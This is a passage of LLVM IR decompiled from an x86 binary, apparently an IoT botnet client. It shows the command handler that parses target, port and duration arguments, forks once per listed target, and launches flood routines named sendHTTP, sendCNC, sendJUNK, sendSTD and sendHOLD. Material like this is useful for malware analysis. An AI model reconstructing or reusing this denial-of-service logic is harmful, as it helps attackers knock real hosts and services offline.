  %v1_804ff0a = icmp eq i1 %v1_804ff08, false
  br i1 %v1_804ff0a, label %dec_label_pc_8050819, label %dec_label_pc_804ff10

dec_label_pc_804ff10:                             ; preds = %dec_label_pc_804ff03
  %v1_804ff13 = add i32 %tmp224, 24
  %v1_804ff16 = inttoptr i32 %v1_804ff13 to i32*
  %v2_804ff16 = load i32, i32* %v1_804ff16, align 4
  %v0_804ff18 = load i32, i32* @esp, align 4
  %v5_804ff18 = icmp ult i32 %v0_804ff18, 12
  store i1 %v5_804ff18, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff16, i32* %stack_var_-508, align 4
  %v1_804ff1c = call i32 @atol(i32 %v2_804ff16)
  store i32 %v1_804ff1c, i32* @ebx, align 4
  %v1_804ff29 = add i32 %tmp224, 20
  %v1_804ff2c = inttoptr i32 %v1_804ff29 to i32*
  %v2_804ff2c = load i32, i32* %v1_804ff2c, align 4
  %v5_804ff2e = icmp ult i32* %stack_var_-492, inttoptr (i32 12 to i32*)
  store i1 %v5_804ff2e, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff2c, i32* %stack_var_-508, align 4
  %v1_804ff32 = call i32 @atol(i32 %v2_804ff2c)
  store i32 %v1_804ff32, i32* @esi, align 4
  %v1_804ff3f = add i32 %tmp224, 16
  %v1_804ff42 = inttoptr i32 %v1_804ff3f to i32*
  %v2_804ff42 = load i32, i32* %v1_804ff42, align 4
  store i32 %v2_804ff42, i32* @edi, align 4
  %v1_804ff49 = add i32 %tmp224, 12
  %v1_804ff4c = inttoptr i32 %v1_804ff49 to i32*
  %v2_804ff4c = load i32, i32* %v1_804ff4c, align 4
  store i1 %v5_804ff2e, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff4c, i32* %stack_var_-508, align 4
  %v1_804ff52 = call i32 @atol(i32 %v2_804ff4c)
  %v1_804ff65 = add i32 %tmp224, 8
  %v1_804ff68 = inttoptr i32 %v1_804ff65 to i32*
  %v2_804ff68 = load i32, i32* %v1_804ff68, align 4
  store i32 %v2_804ff68, i32* %edx.global-to-local, align 4
  %v2_804ff72 = load i32, i32* %v1_804fe1e, align 4
  %v5_804ff74 = icmp ult i32* %stack_var_-492, inttoptr (i32 8 to i32*)
  store i1 %v5_804ff74, i1* %cf.global-to-local, align 1
  %v0_804ff77 = load i32, i32* @ebx, align 4
  %v0_804ff78 = load i32, i32* @esi, align 4
  store i32 %v0_804ff78, i32* %stack_var_-508, align 4
  %v0_804ff79 = load i32, i32* @edi, align 4
  %v6_804ff7d = trunc i32 %v1_804ff52 to i16
  %v7_804ff7d = call i32 @sendHTTP(i32 %v2_804ff72, i32 %v2_804ff68, i16 %v6_804ff7d, i32 %v0_804ff79, i32 %v0_804ff78, i32 %v0_804ff77)
  store i1 %v5_804ff2e, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804ff8a = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ff8f:                             ; preds = %dec_label_pc_804fe36, %dec_label_pc_804fedf, %dec_label_pc_804fdc3
  %v2_804ff92 = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804ffaf = inttoptr i32 %v2_804ff92 to i8*
  store i32 %v2_804ff92, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805ae95.449 to i32), i32* @edi, align 4
  %v7_804ffc1 = call i32 @_strncmp(i8* %v4_804ffaf, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805ae95.449, i32 0, i32 0), i32 4)
  %v8_804ffc1 = urem i32 %v7_804ffc1, 2
  %v9_804ffc1 = icmp eq i32 %v8_804ffc1, 0
  %v0_804ffc3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ffc3 = or i1 %v0_804ffc3, %v9_804ffc1
  %v3_804ffc3 = zext i1 %v2_804ffc3 to i32
  %v4_804ffc3 = load i32, i32* @edx, align 4
  %v5_804ffc3 = and i32 %v4_804ffc3, -256
  %v6_804ffc3 = or i32 %v3_804ffc3, %v5_804ffc3
  %v7_804ffc3 = xor i32 %v6_804ffc3, 1
  store i32 %v7_804ffc3, i32* @edx, align 4
  %v1_804ffcb = trunc i32 %v7_804ffc3 to i8
  %v3_804ffcb = zext i1 %v0_804ffc3 to i8
  %v4_804ffcb = sub nsw i8 %v1_804ffcb, %v3_804ffcb
  %v15_804ffcb = icmp eq i8 %v4_804ffcb, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ffd4 = icmp eq i1 %v15_804ffcb, false
  br i1 %v1_804ffd4, label %dec_label_pc_8050104, label %dec_label_pc_804ffda

dec_label_pc_804ffda:                             ; preds = %dec_label_pc_804ff8f
  %v2_804ffcf = sext i8 %v4_804ffcb to i32
  %v9_804ffda = icmp ult i32 %tmp208, 3
  store i1 %v9_804ffda, i1* %cf.global-to-local, align 1
  %v7_804ffde = icmp sgt i32 %tmp208, 3
  br i1 %v7_804ffde, label %dec_label_pc_804ffe4, label %dec_label_pc_8050819

dec_label_pc_804ffe4:                             ; preds = %dec_label_pc_804ffda
  %v1_804ffe7 = add i32 %tmp224, 8
  %v1_804ffea = inttoptr i32 %v1_804ffe7 to i32*
  %v2_804ffea = load i32, i32* %v1_804ffea, align 4
  %v0_804ffec = load i32, i32* @esp, align 4
  %v5_804ffec = icmp ult i32 %v0_804ffec, 12
  store i1 %v5_804ffec, i1* %cf.global-to-local, align 1
  store i32 %v2_804ffea, i32* %stack_var_-508, align 4
  %v1_804fff0 = call i32 @atol(i32 %v2_804ffea)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp262 = icmp slt i32 %v1_804fff0, 1
  br i1 %tmp262, label %dec_label_pc_8050819, label %dec_label_pc_8050000

dec_label_pc_8050000:                             ; preds = %dec_label_pc_804ffe4
  %v1_8050003 = add i32 %tmp224, 12
  %v1_8050006 = inttoptr i32 %v1_8050003 to i32*
  %v2_8050006 = load i32, i32* %v1_8050006, align 4
  %v5_8050008 = icmp ult i32* %stack_var_-492, inttoptr (i32 12 to i32*)
  store i1 %v5_8050008, i1* %cf.global-to-local, align 1
  store i32 %v2_8050006, i32* %stack_var_-508, align 4
  %v1_805000c = call i32 @atol(i32 %v2_8050006)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp263 = icmp slt i32 %v1_805000c, 1
  %tmp264 = icmp eq i1 %tmp263, false
  br i1 %tmp264, label %dec_label_pc_805001d, label %dec_label_pc_8050819

dec_label_pc_805001d:                             ; preds = %dec_label_pc_8050000
  %v1_8050020 = add i32 %tmp224, 4
  %v1_8050023 = inttoptr i32 %v1_8050020 to i32*
  %v2_8050023 = load i32, i32* %v1_8050023, align 4
  %v2_805002e = load i32, i32* %v1_804ffea, align 4
  store i1 %v5_8050008, i1* %cf.global-to-local, align 1
  store i32 %v2_805002e, i32* %stack_var_-508, align 4
  %v1_8050034 = call i32 @atol(i32 %v2_805002e)
  %v2_8050045 = load i32, i32* %v1_8050006, align 4
  store i1 %v5_8050008, i1* %cf.global-to-local, align 1
  store i32 %v2_8050045, i32* %stack_var_-508, align 4
  %v1_805004b = call i32 @atol(i32 %v2_8050045)
  %v5_8050059 = icmp ult i32* %stack_var_-492, inttoptr (i32 8 to i32*)
  store i1 %v5_8050059, i1* %cf.global-to-local, align 1
  store i32 %v2_8050023, i32* %stack_var_-508, align 4
  %v2_805005f = inttoptr i32 %v2_8050023 to i8*
  %v3_805005f = call i32 @__GI_strchr(i8* %v2_805005f, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050067 = icmp eq i32 %v3_805005f, 0
  br i1 %v1_8050067, label %dec_label_pc_80500d9, label %dec_label_pc_805006b

dec_label_pc_805006b:                             ; preds = %dec_label_pc_805001d
  store i32 %v2_8050023, i32* @eax, align 4
  store i1 %v5_8050059, i1* %cf.global-to-local, align 1
  store i32 %v2_8050023, i32* %stack_var_-508, align 4
  %v2_8050077 = call i32 @__GI_strtok(i32 %v2_8050023, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80500d1295 = icmp eq i32 %v2_8050077, 0
  %v1_80500d5296 = icmp eq i1 %v4_80500d1295, false
  br i1 %v1_80500d5296, label %dec_label_pc_8050084, label %dec_label_pc_8050104

dec_label_pc_8050084:                             ; preds = %dec_label_pc_805006b, %dec_label_pc_80500bc
  %storemerge45297 = phi i32 [ %v2_80500c6, %dec_label_pc_80500bc ], [ %v2_8050077, %dec_label_pc_805006b ]
  %v0_8050084 = call i32 @listFork()
  store i32 %v0_8050084, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050089 = icmp eq i32 %v0_8050084, 0
  %v1_805008b = icmp eq i1 %v1_8050089, false
  %v0_80500bc = load i32, i32* @esp, align 4
  br i1 %v1_805008b, label %dec_label_pc_80500bc, label %dec_label_pc_805008d

dec_label_pc_805008d:                             ; preds = %dec_label_pc_8050084
  %v5_805008d = icmp ult i32 %v0_80500bc, 4
  store i1 %v5_805008d, i1* %cf.global-to-local, align 1
  store i32 %storemerge45297, i32* %stack_var_-508, align 4
  %v3_8050099 = call i32 @sendCNC(i32 %storemerge45297, i32 %v1_8050034, i32 %v1_805004b)
  %v0_80500a1 = load i32, i32* @global_var_805d480.20, align 128
  store i1 %v5_8050008, i1* %cf.global-to-local, align 1
  store i32 %v0_80500a1, i32* %stack_var_-508, align 4
  %v1_80500aa = call i32 @__libc_close(i32 %v0_80500a1)
  store i1 %v5_8050008, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_80500b7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80500bc:                             ; preds = %dec_label_pc_8050084
  %v5_80500bc = icmp ult i32 %v0_80500bc, 8
  store i1 %v5_80500bc, i1* %cf.global-to-local, align 1
  %v2_80500c6 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80500d1 = icmp eq i32 %v2_80500c6, 0
  %v1_80500d5 = icmp eq i1 %v4_80500d1, false
  br i1 %v1_80500d5, label %dec_label_pc_8050084, label %dec_label_pc_8050104

dec_label_pc_80500d9:                             ; preds = %dec_label_pc_805001d
  %v0_80500d9 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80500de = icmp eq i32 %v0_80500d9, 0
  %v1_80500e0 = icmp eq i1 %v1_80500de, false
  br i1 %v1_80500e0, label %dec_label_pc_8050819, label %dec_label_pc_80500e6

dec_label_pc_80500e6:                             ; preds = %dec_label_pc_80500d9
  %v0_80500e6 = load i32, i32* @esp, align 4
  %v5_80500e6 = icmp ult i32 %v0_80500e6, 4
  store i1 %v5_80500e6, i1* %cf.global-to-local, align 1
  store i32 %v2_8050023, i32* %stack_var_-508, align 4
  %v3_80500f2 = call i32 @sendCNC(i32 %v2_8050023, i32 %v1_8050034, i32 %v1_805004b)
  store i1 %v5_8050008, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_80500ff = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050104:                             ; preds = %dec_label_pc_805006b, %dec_label_pc_80500bc, %dec_label_pc_804ff8f
  %v2_8050107 = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_8050124 = inttoptr i32 %v2_8050107 to i8*
  store i32 %v2_8050107, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805ae99.450 to i32), i32* @edi, align 4
  %v7_8050136 = call i32 @_strncmp(i8* %v4_8050124, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805ae99.450, i32 0, i32 0), i32 6)
  %v8_8050136 = urem i32 %v7_8050136, 2
  %v9_8050136 = icmp eq i32 %v8_8050136, 0
  %v0_8050138 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050138 = or i1 %v0_8050138, %v9_8050136
  %v3_8050138 = zext i1 %v2_8050138 to i32
  %v4_8050138 = load i32, i32* @edx, align 4
  %v5_8050138 = and i32 %v4_8050138, -256
  %v6_8050138 = or i32 %v3_8050138, %v5_8050138
  %v7_8050138 = xor i32 %v6_8050138, 1
  store i32 %v7_8050138, i32* @edx, align 4
  %v1_8050140 = trunc i32 %v7_8050138 to i8
  %v3_8050140 = zext i1 %v0_8050138 to i8
  %v4_8050140 = sub nsw i8 %v1_8050140, %v3_8050140
  %v15_8050140 = icmp eq i8 %v4_8050140, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050149 = icmp eq i1 %v15_8050140, false
  br i1 %v1_8050149, label %dec_label_pc_80502cd, label %dec_label_pc_805014f

dec_label_pc_805014f:                             ; preds = %dec_label_pc_8050104
  %v2_8050144 = sext i8 %v4_8050140 to i32
  %v9_805014f = icmp ult i32 %tmp208, 3
  store i1 %v9_805014f, i1* %cf.global-to-local, align 1
  %v7_8050153 = icmp sgt i32 %tmp208, 3
  br i1 %v7_8050153, label %dec_label_pc_8050159, label %dec_label_pc_8050819

dec_label_pc_8050159:                             ; preds = %dec_label_pc_805014f
  %v1_805015c = add i32 %tmp224, 8
  %v1_805015f = inttoptr i32 %v1_805015c to i32*
  %v2_805015f = load i32, i32* %v1_805015f, align 4
  %v0_8050161 = load i32, i32* @esp, align 4
  %v5_8050161 = icmp ult i32 %v0_8050161, 12
  store i1 %v5_8050161, i1* %cf.global-to-local, align 1
  %v1_8050165 = call i32 @atol(i32 %v2_805015f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp265 = icmp slt i32 %v1_8050165, 1
  br i1 %tmp265, label %dec_label_pc_8050819, label %dec_label_pc_8050175

dec_label_pc_8050175:                             ; preds = %dec_label_pc_8050159
  %v1_8050178 = add i32 %tmp224, 12
  %v1_805017b = inttoptr i32 %v1_8050178 to i32*
  %v2_805017b = load i32, i32* %v1_805017b, align 4
  %v5_805017d = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_805017d, i1* %cf.global-to-local, align 1
  %v1_8050181 = call i32 @atol(i32 %v2_805017b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp266 = icmp slt i32 %v1_8050181, 1
  %tmp267 = icmp eq i1 %tmp266, false
  br i1 %tmp267, label %dec_label_pc_8050192, label %dec_label_pc_8050819

dec_label_pc_8050192:                             ; preds = %dec_label_pc_8050175
  %v1_8050195 = add i32 %tmp224, 4
  %v1_8050198 = inttoptr i32 %v1_8050195 to i32*
  %v2_8050198 = load i32, i32* %v1_8050198, align 4
  %v2_80501a3 = load i32, i32* %v1_805015f, align 4
  store i1 %v5_805017d, i1* %cf.global-to-local, align 1
  %v1_80501a9 = call i32 @atol(i32 %v2_80501a3)
  %v2_80501ba = load i32, i32* %v1_805017b, align 4
  store i1 %v5_805017d, i1* %cf.global-to-local, align 1
  %v1_80501c0 = call i32 @atol(i32 %v2_80501ba)
  %v5_80501ce = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_80501ce, i1* %cf.global-to-local, align 1
  %v2_80501d4 = inttoptr i32 %v2_8050198 to i8*
  %v3_80501d4 = call i32 @__GI_strchr(i8* %v2_80501d4, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80501dc = icmp eq i32 %v3_80501d4, 0
  br i1 %v1_80501dc, label %dec_label_pc_805027a, label %dec_label_pc_80501e4

dec_label_pc_80501e4:                             ; preds = %dec_label_pc_8050192
  store i32 %v2_8050198, i32* @eax, align 4
  store i1 %v5_80501ce, i1* %cf.global-to-local, align 1
  %v2_80501f0 = call i32 @__GI_strtok(i32 %v2_8050198, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050272292 = icmp eq i32 %v2_80501f0, 0
  %v1_8050276293 = icmp eq i1 %v4_8050272292, false
  br i1 %v1_8050276293, label %dec_label_pc_80501fd, label %dec_label_pc_80502cd

dec_label_pc_80501fd:                             ; preds = %dec_label_pc_80501e4, %dec_label_pc_805025d
  %storemerge118294 = phi i32 [ %v2_8050267, %dec_label_pc_805025d ], [ %v2_80501f0, %dec_label_pc_80501e4 ]
  %v0_80501fd = call i32 @listFork()
  store i32 %v0_80501fd, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050202 = icmp eq i32 %v0_80501fd, 0
  %v1_8050204 = icmp eq i1 %v1_8050202, false
  %v0_805025d = load i32, i32* @esp, align 4
  br i1 %v1_8050204, label %dec_label_pc_805025d, label %dec_label_pc_8050206

dec_label_pc_8050206:                             ; preds = %dec_label_pc_80501fd
  %v5_8050206 = icmp ult i32 %v0_805025d, 4
  store i1 %v5_8050206, i1* %cf.global-to-local, align 1
  %v3_8050212 = call i32 @sendJUNK(i32 %storemerge118294, i32 %v1_80501a9, i32 %v1_80501c0)
  %v5_805021a = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_805021a, i1* %cf.global-to-local, align 1
  %v3_8050226 = trunc i32 %v1_80501a9 to i16
  %v4_8050226 = call i32 @sendSTD(i32 %storemerge118294, i16 %v3_8050226, i32 %v1_80501c0)
  store i1 %v5_805021a, i1* %cf.global-to-local, align 1
  %v3_805023a = call i32 @sendHOLD(i32 %storemerge118294, i32 %v1_80501a9, i32 %v1_80501c0)
  %v0_8050242 = load i32, i32* @global_var_805d480.20, align 128
  store i1 %v5_805017d, i1* %cf.global-to-local, align 1
  %v1_805024b = call i32 @__libc_close(i32 %v0_8050242)
  store i1 %v5_805017d, i1* %cf.global-to-local, align 1
  %v1_8050258 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_805025d:                             ; preds = %dec_label_pc_80501fd
  %v5_805025d = icmp ult i32 %v0_805025d, 8
  store i1 %v5_805025d, i1* %cf.global-to-local, align 1
  %v2_8050267 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050272 = icmp eq i32 %v2_8050267, 0
  %v1_8050276 = icmp eq i1 %v4_8050272, false
  br i1 %v1_8050276, label %dec_label_pc_80501fd, label %dec_label_pc_80502cd

dec_label_pc_805027a:                             ; preds = %dec_label_pc_8050192
  %v0_805027a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805027f = icmp eq i32 %v0_805027a, 0
  %v1_8050281 = icmp eq i1 %v1_805027f, false
  br i1 %v1_8050281, label %dec_label_pc_8050819, label %dec_label_pc_8050287

dec_label_pc_8050287:                             ; preds = %dec_label_pc_805027a
  %v0_8050287 = load i32, i32* @esp, align 4
  %v5_8050287 = icmp ult i32 %v0_8050287, 4
  store i1 %v5_8050287, i1* %cf.global-to-local, align 1
  %v3_8050293 = call i32 @sendJUNK(i32 %v2_8050198, i32 %v1_80501a9, i32 %v1_80501c0)
  %v5_805029b = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_805029b, i1* %cf.global-to-local, align 1
  %v3_80502a7 = trunc i32 %v1_80501a9 to i16
  %v4_80502a7 = call i32 @sendSTD(i32 %v2_8050198, i16 %v3_80502a7, i32 %v1_80501c0)
  store i1 %v5_805029b, i1* %cf.global-to-local, align 1
  %v3_80502bb = call i32 @sendHOLD(i32 %v2_8050198, i32 %v1_80501a9, i32 %v1_80501c0)
  store i1 %v5_805017d, i1* %cf.global-to-local, align 1
  %v1_80502c8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80502cd:                             ; preds = %dec_label_pc_80501e4, %dec_label_pc_805025d, %dec_label_pc_8050104
  %v2_80502d0 = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_80502ed = inttoptr i32 %v2_80502d0 to i8*
  store i32 %v2_80502d0, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805ae9f.451 to i32), i32* @edi, align 4
  %v7_80502ff = call i32 @_strncmp(i8* %v4_80502ed, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805ae9f.451, i32 0, i32 0), i32 4)
  %v8_80502ff = urem i32 %v7_80502ff, 2
  %v9_80502ff = icmp eq i32 %v8_80502ff, 0
  %v0_8050301 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050301 = or i1 %v0_8050301, %v9_80502ff
  %v3_8050301 = zext i1 %v2_8050301 to i32
  %v4_8050301 = load i32, i32* @edx, align 4
  %v5_8050301 = and i32 %v4_8050301, -256
  %v6_8050301 = or i32 %v3_8050301, %v5_8050301
  %v7_8050301 = xor i32 %v6_8050301, 1
  store i32 %v7_8050301, i32* @edx, align 4
  %v1_8050309 = trunc i32 %v7_8050301 to i8
  %v3_8050309 = zext i1 %v0_8050301 to i8
  %v4_8050309 = sub nsw i8 %v1_8050309, %v3_8050309
  %v15_8050309 = icmp eq i8 %v4_8050309, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050312 = icmp eq i1 %v15_8050309, false
  br i1 %v1_8050312, label %dec_label_pc_8050431, label %dec_label_pc_8050318

dec_label_pc_8050318:                             ; preds = %dec_label_pc_80502cd
  %v2_805030d = sext i8 %v4_8050309 to i32
  %v9_8050318 = icmp ult i32 %tmp208, 3
  store i1 %v9_8050318, i1* %cf.global-to-local, align 1
  %v7_805031c = icmp sgt i32 %tmp208, 3
  br i1 %v7_805031c, label %dec_label_pc_8050322, label %dec_label_pc_8050819

dec_label_pc_8050322:                             ; preds = %dec_label_pc_8050318
  %v1_8050325 = add i32 %tmp224, 8
  %v1_8050328 = inttoptr i32 %v1_8050325 to i32*
  %v2_8050328 = load i32, i32* %v1_8050328, align 4
  %v0_805032a = load i32, i32* @esp, align 4
  %v5_805032a = icmp ult i32 %v0_805032a, 12
  store i1 %v5_805032a, i1* %cf.global-to-local, align 1
  %v1_805032e = call i32 @atol(i32 %v2_8050328)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp268 = icmp slt i32 %v1_805032e, 1
  br i1 %tmp268, label %dec_label_pc_8050819, label %dec_label_pc_805033e

dec_label_pc_805033e:                             ; preds = %dec_label_pc_8050322
  %v1_8050341 = add i32 %tmp224, 12
  %v1_8050344 = inttoptr i32 %v1_8050341 to i32*
  %v2_8050344 = load i32, i32* %v1_8050344, align 4
  %v5_8050346 = icmp ult i32* %stack_var_-508, inttoptr (i32 12 to i32*)
  store i1 %v5_8050346, i1* %cf.global-to-local, align 1
  %v1_805034a = call i32 @atol(i32 %v2_8050344)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp269 = icmp slt i32 %v1_805034a, 1
  %tmp270 = icmp eq i1 %tmp269, false
  br i1 %tmp270, label %dec_label_pc_805035b, label %dec_label_pc_8050819

dec_label_pc_805035b:                             ; preds = %dec_label_pc_805033e
  %v1_805035e = add i32 %tmp224, 4
  %v1_8050361 = inttoptr i32 %v1_805035e to i32*
  %v2_8050361 = load i32, i32* %v1_8050361, align 4
  %v2_805036c = load i32, i32* %v1_8050328, align 4
  store i1 %v5_8050346, i1* %cf.global-to-local, align 1
  %v1_8050372 = call i32 @atol(i32 %v2_805036c)
  %v2_8050383 = load i32, i32* %v1_8050344, align 4
  store i1 %v5_8050346, i1* %cf.global-to-local, align 1
  %v1_8050389 = call i32 @atol(i32 %v2_8050383)
  %v5_8050397 = icmp ult i32* %stack_var_-508, inttoptr (i32 8 to i32*)
  store i1 %v5_8050397, i1* %cf.global-to-local, align 1
  %v2_805039d = inttoptr i32 %v2_8050361 to i8*
  %v3_805039d = call i32 @__GI_strchr(i8* %v2_805039d, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503a5 = icmp eq i32 %v3_805039d, 0
  br i1 %v1_80503a5, label %dec_label_pc_8050406, label %dec_label_pc_80503a9

dec_label_pc_80503a9:                             ; preds = %dec_label_pc_805035b
  store i32 %v2_8050361, i32* @eax, align 4
  store i1 %v5_8050397, i1* %cf.global-to-local, align 1
  %v2_80503b5 = call i32 @__GI_strtok(i32 %v2_8050361, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80503fe289 = icmp eq i32 %v2_80503b5, 0
  %v1_8050402290 = icmp eq i1 %v4_80503fe289, false
  br i1 %v1_8050402290, label %dec_label_pc_80503c2, label %dec_label_pc_8050431

dec_label_pc_80503c2:                             ; preds = %dec_label_pc_80503a9, %dec_label_pc_80503e9
  %storemerge119291 = phi i32 [ %v2_80503f3, %dec_label_pc_80503e9 ], [ %v2_80503b5, %dec_label_pc_80503a9 ]
  %v0_80503c2 = call i32 @listFork()
  store i32 %v0_80503c2, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503c7 = icmp eq i32 %v0_80503c2, 0
  %v1_80503c9 = icmp eq i1 %v1_80503c7, false
  %v0_80503e9 = load i32, i32* @esp, align 4
  br i1 %v1_80503c9, label %dec_label_pc_80503e9, label %dec_label_pc_80503cb

dec_label_pc_80503cb:                             ; preds = %dec_label_pc_80503c2
  %v5_80503cb = icmp ult i32 %v0_80503e9, 4
  store i1 %v5_80503cb, i1* %cf.global-to-local, align 1
  %v3_80503d7 = trunc i32 %v1_8050372 to i16
  %v4_80503d7 = call i32 @sendSTD(i32 %storemerge119291, i16 %v3_80503d7, i32 %v1_8050389)
  store i1 %v5_8050346, i1* %cf.global-to-local, align 1
  %v1_80503e4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80503e9:                             ; preds = %dec_label_pc_80503c2
  %v5_80503e9 = icmp ult i32 %v0_80503e9, 8
  store i1 %v5_80503e9, i1* %cf.global-to-local, align 1
  %v2_80503f3 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80503fe = icmp eq i32 %v2_80503f3, 0
  %v1_8050402 = icmp eq i1 %v4_80503fe, false
  br i1 %v1_8050402, label %dec_label_pc_80503c2, label %dec_label_pc_8050431

dec_label_pc_8050406:                             ; preds = %dec_label_pc_805035b
  %v0_8050406 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805040b = icmp eq i32 %v0_8050406, 0
  %v1_805040d = icmp eq i1 %v1_805040b, false
  br i1 %v1_805040d, label %dec_label_pc_8050819, label %dec_label_pc_8050413

dec_label_pc_8050413:                             ; preds = %dec_label_pc_8050406
  %v0_8050413 = load i32, i32* @esp, align 4
  %v5_8050413 = icmp ult i32 %v0_8050413, 4
  store i1 %v5_8050413, i1* %cf.global-to-local, align 1
  %v3_805041f = trunc i32 %v1_8050372 to i16
  %v4_805041f = call i32 @sendSTD(i32 %v2_8050361, i16 %v3_805041f, i32 %v1_8050389)
  store i1 %v5_8050346, i1* %cf.global-to-local, align 1
  %v1_805042c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050431:                             ; preds = %dec_label_pc_80503a9, %dec_label_pc_80503e9, %dec_label_pc_80502cd
  %v2_8050434 = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_8050451 = inttoptr i32 %v2_8050434 to i8*
  %v7_8050463 = call i32 @_strncmp(i8* %v4_8050451, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aea3.452, i32 0, i32 0), i32 4)
  %v8_8050463 = urem i32 %v7_8050463, 2
  %v9_8050463 = icmp eq i32 %v8_8050463, 0
  %v0_8050465 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050465 = or i1 %v0_8050465, %v9_8050463
  %v3_8050465 = zext i1 %v2_8050465 to i32
  %v4_8050465 = load i32, i32* @edx, align 4
  %v5_8050465 = and i32 %v4_8050465, -256
  %v6_8050465 = or i32 %v3_8050465, %v5_8050465
  %v7_8050465 = xor i32 %v6_8050465, 1
  store i32 %v7_8050465, i32* @edx, align 4
  %v1_805046d = trunc i32 %v7_8050465 to i8
  %v3_805046d = zext i1 %v0_8050465 to i8
  %v4_805046d = sub nsw i8 %v1_805046d, %v3_805046d
  %v15_805046d = icmp eq i8 %v4_805046d, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050476 = icmp eq i1 %v15_805046d, false
  br i1 %v1_8050476, label %dec_label_pc_80506b9, label %dec_label_pc_805047c

dec_label_pc_805047c:                             ; preds = %dec_label_pc_8050431
  %v2_8050471 = sext i8 %v4_805046d to i32
  %v9_805047c = icmp ult i32 %tmp208, 5
  store i1 %v9_805047c, i1* %cf.global-to-local, align 1
  %v7_8050480 = icmp sgt i32 %tmp208, 5
  br i1 %v7_8050480, label %dec_label_pc_8050486, label %dec_label_pc_8050819

dec_label_pc_8050486:                             ; preds = %dec_label_pc_805047c
  %v1_8050489 = add i32 %tmp224, 12
  %v1_805048c = inttoptr i32 %v1_8050489 to i32*
  %v2_805048c = load i32, i32* %v1_805048c, align 4
  %v0_805048e = load i32, i32* @esp, align 4
  %v5_805048e = icmp ult i32 %v0_805048e, 12
  store i1 %v5_805048e, i1* %cf.global-to-local, align 1
  %v1_8050492 = call i32 @atol(i32 %v2_805048c)
  %v5_805049a = icmp ne i32 %v1_8050492, -1
  store i1 %v5_805049a, i1* %cf.global-to-local, align 1
  %v10_805049a = icmp eq i32 %v1_8050492, -1
  br i1 %v10_805049a, label %dec_label_pc_8050819, label %dec_label_pc_80504a3

dec_label_pc_80504a3:                             ; preds = %dec_label_pc_8050486
  %v1_80504a6 = add i32 %tmp224, 8
  %v1_80504a9 = inttoptr i32 %v1_80504a6 to i32*
  %v2_80504a9 = load i32, i32* %v1_80504a9, align 4
  %v5_80504ab = icmp ult i32* %stack_var_-508, inttoptr (i32 12 to i32*)
